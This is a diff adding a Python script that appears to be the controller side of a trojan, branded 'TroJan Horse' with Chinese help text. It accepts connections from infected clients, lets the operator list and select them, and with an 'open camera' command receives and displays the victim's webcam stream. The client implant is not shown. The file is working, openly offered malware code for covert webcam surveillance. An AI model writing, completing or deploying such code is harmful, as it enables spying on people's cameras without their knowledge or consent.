@@ -1,0 +1,129 @@
+import socket
+import cv2
+import sys
+import os
+import numpy as np
+
+title = f"""
+TTTTTTTTTTTTTTTTTTTTTTT                                                JJJJJJJJJJJ                                  HHHHHHHHH     HHHHHHHHH                                                      
+T:::::::::::::::::::::T                                                J:::::::::J                                  H:::::::H     H:::::::H                                                      
+T:::::::::::::::::::::T                                                J:::::::::J                                  H:::::::H     H:::::::H                                                      
+T:::::TT:::::::TT:::::T                                                JJ:::::::JJ                                  HH::::::H     H::::::HH                                                      
+TTTTTT  T:::::T  TTTTTTrrrrr   rrrrrrrrr      ooooooooooo                J:::::J  aaaaaaaaaaaaa  nnnn  nnnnnnnn       H:::::H     H:::::H     ooooooooooo   rrrrr   rrrrrrrrr       ssssssssss        eeeeeeeeeeee    
+        T:::::T        r::::rrr:::::::::r   oo:::::::::::oo              J:::::J  a::::::::::::a n:::nn::::::::nn     H:::::H     H:::::H   oo:::::::::::oo r::::rrr:::::::::r    ss::::::::::s     ee::::::::::::ee  
+        T:::::T        r:::::::::::::::::r o:::::::::::::::o             J:::::J  aaaaaaaaa:::::an::::::::::::::nn    H::::::HHHHH::::::H  o:::::::::::::::or:::::::::::::::::r ss:::::::::::::s   e::::::eeeee:::::ee
+        T:::::T        rr::::::rrrrr::::::ro:::::ooooo:::::o             J:::::j           a::::ann:::::::::::::::n   H:::::::::::::::::H  o:::::ooooo:::::orr::::::rrrrr::::::rs::::::ssss:::::s e::::::e     e:::::e
+        T:::::T         r:::::r     r:::::ro::::o     o::::o             J:::::J    aaaaaaa:::::a  n:::::nnnn:::::n   H:::::::::::::::::H  o::::o     o::::o r:::::r     r:::::r s:::::s  ssssss  e:::::::eeeee::::::e
+        T:::::T         r:::::r     rrrrrrro::::o     o::::oJ JJJJJJ     J:::::J  aa::::::::::::a  n::::n    n::::n   H::::::HHHHH::::::H  o::::o     o::::o r:::::r     rrrrrrr   s::::::s       e:::::::::::::::::e 
+        T:::::T         r:::::r            o::::o     o::::oJ :::::J     J:::::J a::::aaaa::::::a  n::::n    n::::n   H:::::H     H:::::H  o::::o     o::::o r:::::r                  s::::::s    e::::::eeeeeeeeeee  
+        T:::::T         r:::::r            o::::o     o::::oJ ::::::J   J::::::Ja::::a    a:::::a  n::::n    n::::n   H:::::H     H:::::H  o::::o     o::::o r:::::r            ssssss   s:::::s  e:::::::e           
+      TT:::::::TT       r:::::r            o:::::ooooo:::::oJ :::::::JJJ:::::::Ja::::a    a:::::a  n::::n    n::::n HH::::::H     H::::::HHo:::::ooooo:::::o r:::::r            s:::::ssss::::::s e::::::::e          
+      T:::::::::T       r:::::r            o:::::::::::::::o  JJ:::::::::::::JJ a:::::aaaa::::::a  n::::n    n::::n H:::::::H     H:::::::Ho:::::::::::::::o r:::::r            s::::::::::::::s   e::::::::eeeeeeee  
+      T:::::::::T       r:::::r             oo:::::::::::oo     JJ:::::::::JJ    a::::::::::aa:::a n::::n    n::::n H:::::::H     H:::::::H oo:::::::::::oo  r:::::r             s:::::::::::ss     ee:::::::::::::e  
+      TTTTTTTTTTT       rrrrrrr               ooooooooooo         JJJJJJJJJ       aaaaaaaaaa  aaaa nnnnnn    nnnnnn HHHHHHHHH     HHHHHHHHH   ooooooooooo    rrrrrrr              sssssssssss         eeeeeeeeeeeeee  
+      
+输入 'help' 获取帮助
+{'=' * 214}
+"""
+
+help_server = """
+============== 服务器命令 ==============
+cls: 清屏
+exit: 退出程序
+help: 获取帮助
+list: 列出所有客户端
+sel [序列号]: 连接到客户端
+open camera: 打开客户端摄像头
+=======================================
+"""
+
+os.system('cls')
+host = input('IP (默认 127.0.0.1) :') or "127.0.0.1"
+port_input = input("端口 (默认 1000) :")
+port = int(port_input) if port_input else 1000
+
+os.system('cls')
+print(title)
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((host, port))
+server_socket.listen(5)
+print(f"服务器正在监听 {host}:{port}\n")
+
+client_list = []
+connected_client = None
+while True:
+    try:
+        try:
+            server_socket.settimeout(0.1)
+            client_socket, address = server_socket.accept()
+            print(f"新客户端已连接: {address}")
+            client_list.append((client_socket, address))
+        except socket.timeout:
+            pass
+
+        command = input("TroJan Horse [camera] $ >")
+
+        if command.lower() == "help":
+            print(help_server)
+        elif command.lower() == "cls":
+            os.system("cls")
+            print(title)
+        elif command == "exit":
+            for client, _ in client_list:
+                client.close()
+            server_socket.close()
+            sys.exit()
+
+        elif command.lower() == "list":
+            if not client_list:
+                print("当前没有客户端连接")
+            else:
+                print("已连接客户端列表:")
+                for i, (_, address) in enumerate(client_list):
+                    print(f"{i}: {address}")
+        elif command.lower().startswith('sel '):
+            try:
+                index = int(command.split(' ')[1])
+                if 0 <= index < len(client_list):
+                    connected_client = client_list[index][0]
+                    print(f"已连接到客户端 {client_list[index][1]}")
+                else:
+                    print("无效的客户端序列号")
+            except (IndexError, ValueError):
+                print("请使用'sel [客户端序列号]'")
+        elif command == "open camera":
+            if connected_client is None:
+                print("没有客户端连接")
+            else:
+                connected_client.sendall(command.encode())
+                while True:
+                    try:
+                        data = connected_client.recv(16)
+                        if not data:
+                            break
+                        frame_size = int(data.decode())
+                        frame_data = b""
+                        while len(frame_data) < frame_size:
+                            remaining = frame_size - len(frame_data)
+                            frame_data += connected_client.recv(min(4096, remaining))
+                        frame = np.frombuffer(frame_data, dtype=np.uint8)
+                        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+                        cv2.imshow('客户端摄像头', frame)
+                        if cv2.waitKey(1) & 0xFF == ord('q'):
+                            break
+                    except Exception as e:
+                        print(f"错误: {e}")
+                        break
+                cv2.destroyAllWindows()
+                connected_client.close()
+                client_list = [client for client in client_list if client[0] != connected_client]
+                connected_client = None
+    except Exception as e:
+        print(f"错误: {e}")
+        if connected_client:
+            connected_client.close()
+            client_list = [client for client in client_list if client[0] != connected_client]
+            connected_client = None
+    except KeyboardInterrupt:
+        sys.exit()
